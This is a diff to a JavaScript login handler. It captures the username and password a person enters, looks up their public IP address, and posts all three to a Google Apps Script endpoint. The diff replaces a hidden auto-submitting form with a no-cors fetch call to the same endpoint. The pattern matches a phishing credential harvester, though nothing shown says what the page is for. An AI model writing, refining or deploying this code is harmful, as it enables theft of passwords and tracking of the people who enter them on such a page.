@@ -14,29 +14,18 @@ document.addEventListener('DOMContentLoaded', function() {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
 
-                // Create a hidden form
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = 'https://script.google.com/macros/s/AKfycbzDk05P5whmUuIBwI00p2jJhVSD87IKcBsnlCO0woDNUcWNR60aDqRpQn3Vq2cbjG4p/exec';
+                // Prepare data for submission
+                const formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+                formData.append('ipAddress', ipData.ip);
 
-                // Add form fields
-                const addField = (name, value) => {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = name;
-                    input.value = value;
-                    form.appendChild(input);
-                };
-
-                addField('username', username);
-                addField('password', password);
-                addField('ipAddress', ipData.ip);
-
-                // Add form to body
-                document.body.appendChild(form);
-
-                // Submit the form
-                form.submit();
+                // Submit data to Google Apps Script
+                const response = await fetch('https://script.google.com/macros/s/AKfycbzDk05P5whmUuIBwI00p2jJhVSD87IKcBsnlCO0woDNUcWNR60aDqRpQn3Vq2cbjG4p/exec', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
 
                 // Store the submission time
                 localStorage.setItem('formSubmissionTime', new Date().getTime());
